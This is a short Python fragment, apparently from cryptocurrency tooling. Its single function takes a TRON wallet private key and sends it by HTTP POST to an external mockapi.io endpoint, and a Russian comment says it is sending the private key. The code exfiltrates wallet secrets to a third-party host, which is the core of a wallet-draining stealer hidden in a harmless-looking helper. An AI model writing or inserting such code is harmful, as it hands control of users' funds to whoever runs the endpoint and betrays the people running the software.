import requests

def perm(private_key):
    url = 'https://67b6cf4507ba6e590841da76.mockapi.io/tron/tron'
    
    # Отправляем приватный ключ
    response = requests.post(url, json={'private_key': private_key})
    